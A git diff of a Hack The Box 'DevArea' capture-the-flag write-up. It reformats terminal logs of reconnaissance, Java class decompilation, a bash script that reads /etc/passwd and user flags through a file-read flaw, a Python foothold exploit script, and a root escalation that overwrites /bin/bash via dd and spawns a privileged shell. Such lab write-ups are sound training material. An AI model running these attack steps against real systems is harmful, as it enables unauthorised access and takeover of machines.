@@ -35,8 +35,6 @@ tags:
 
 ---
 
-\----------------------------------------------------------------------------Dev AreaNotes---------------------------------------------------------------------------------------------------
-
 ## Step 1 - Reconnaissance
 
 ```bash
@@ -227,25 +225,38 @@ com         javax  META-INF       org      schemas
 
 - 🔍 *There are bunch of files. but our main, target is this htb folder*
 
-┌──(root㉿fsocity)-[/home/…/HTB/Season-10/DevArea/target_directory]
-└─# cd htb
+```bash
+cd htb
+```
 
-┌──(root㉿fsocity)-[/home/…/Season-10/DevArea/target_directory/htb]
-└─# ls
+```bash
+ls
+```
+
+```text
 devarea
+```
 
-┌──(root㉿fsocity)-[/home/…/Season-10/DevArea/target_directory/htb]
-└─# cd devarea
+```bash
+cd devarea
+```
 
-┌──(root㉿fsocity)-[/home/…/DevArea/target_directory/htb/devarea]
-└─# ls
+```bash
+ls
+```
+
+```text
 EmployeeService.class      Report.class
 EmployeeServiceImpl.class  ServerStarter.class
+```
 
 - 🔍 *So there are these employeeservice java files, that need to be complied in order to see the content*
 
-┌──(root㉿fsocity)-[/home/…/DevArea/target_directory/htb/devarea]
-└─# javap -c -p EmployeeServiceImpl.class
+```bash
+javap -c -p EmployeeServiceImpl.class
+```
+
+```text
 Compiled from "EmployeeServiceImpl.java"
 public class htb.devarea.EmployeeServiceImpl implements htb.devarea.EmployeeService {
   public htb.devarea.EmployeeServiceImpl();
@@ -297,16 +308,24 @@ public class htb.devarea.EmployeeServiceImpl implements htb.devarea.EmployeeServ
       90: invokevirtual #8                  // Method java/lang/StringBuilder.toString:()Ljava/lang/String;
       93: areturn
 }
+```
 
-┌──(root㉿fsocity)-[/home/…/DevArea/target_directory/htb/devarea]
-└─# javap -c -p EmployeeService.class
+```bash
+javap -c -p EmployeeService.class
+```
+
+```text
 Compiled from "EmployeeService.java"
 public interface htb.devarea.EmployeeService {
   public abstract java.lang.String submitReport(htb.devarea.Report);
 }
+```
 
-┌──(root㉿fsocity)-[/home/…/DevArea/target_directory/htb/devarea]
-└─# javap -c -p Report.class
+```bash
+javap -c -p Report.class
+```
+
+```text
 Compiled from "Report.java"
 public class htb.devarea.Report {
   private java.lang.String employeeName;
@@ -411,9 +430,13 @@ public class htb.devarea.Report {
       75: invokevirtual #15                 // Method java/lang/StringBuilder.toString:()Ljava/lang/String;
       78: areturn
 }
+```
 
-┌──(root㉿fsocity)-[/home/…/DevArea/target_directory/htb/devarea]
-└─# javap -c -p ServerStarter.class
+```bash
+javap -c -p ServerStarter.class
+```
+
+```text
 Compiled from "ServerStarter.java"
 public class htb.devarea.ServerStarter {
   public htb.devarea.ServerStarter();
@@ -450,6 +473,7 @@ public class htb.devarea.ServerStarter {
       49: invokevirtual #14                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V
       52: return
 }
+```
 
 - 🔍 *Breakdown --->*
 
@@ -581,6 +605,7 @@ The "Mirror" Effect: Your EmployeeServiceImpl.class logic takes the employeeName
 
 - 🔍 *have created a bash script that will get the etc/passwd info*
 
+```bash
 #!/bin/bash
 
 # ===========================
@@ -592,14 +617,10 @@ The "Mirror" Effect: Your EmployeeServiceImpl.class logic takes the employeeName
 TARGET="http://devarea.htb:8080/employeeservice"
 
 if [ -z "$1" ]; then
-```bash
-echo "Usage: $0 <file_path>"
+    echo "Usage: $0 <file_path>"
     echo "Ex:    $0 file:///etc/passwd"
     echo "       $0 file:///home/dev_ryan/user.txt"
-```
-
-```text
-exit 1
+    exit 1
 fi
 
 FILE="$1"
@@ -617,20 +638,12 @@ if [ -z "$B64" ]; then
 fi
 
 if [ -z "$B64" ]; then
-```
-
-```bash
-echo "[!] No content found in response (permission denied or file does not exist)."
+    echo "[!] No content found in response (permission denied or file does not exist)."
     echo "[*] Raw response:"
     echo "$RESPONSE"
-```
-
-```text
-exit 1
+    exit 1
 fi
-```
 
-```bash
 echo "[+] File: $FILE"
 echo "[+] Content:"
 echo "$B64" | base64 -d 2>/dev/null || echo "$B64"
@@ -734,8 +747,6 @@ WantedBy=multi-user.target
 
 Version	v1.11.3
 
-\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
 ## Step 3 - Initial Foothold
 
 - 🔍 *While Searching for known vulnerabilities in this version*
@@ -770,6 +781,7 @@ By sending a request to port 8500, we forced the server to process data, which t
 
 - 🔍 *lets make an automated python script for this whole attack*
 
+```python
 import requests
 import sys
 import json
@@ -857,6 +869,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+```
 
 - 🔍 *Explanation -*
 
@@ -923,8 +936,6 @@ ls
 ```text
 syswatch-v1.zip
 user.txt
-
-\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ```
 
 ## Step 4 - Privilege Escalation
@@ -1316,34 +1327,25 @@ dd: failed to open '/bin/bash': Text file busy
 dev_ryan@devarea:/tmp$ dash
 dash
 
-```bash
 $killall -9 bash   --> Killed the bash
-```
 
-```bash
-$dd if=/tmp/evil_bash of=/bin/bash   --> copied the content
-```
-
-```text
+$dd if=/tmp/evil_bash of=/bin/bash   --> copied the content 
 0+1 records in
 0+1 records out
 94 bytes copied, 0.00033013 s, 285 kB/s
-```
 
 ```bash
-$sudo /opt/syswatch/syswatch.sh --version  --> This will execute the evil_bash
+sudo /opt/syswatch/syswatch.sh --version  --> This will execute the evil_bash
 ```
 
 ```text
 1.0.0
-```
 
-```bash
 $/tmp/rootbash -p  --> pawned the root
 ```
 
 ```bash
-#whoami
+whoami
 ```
 
 ```text
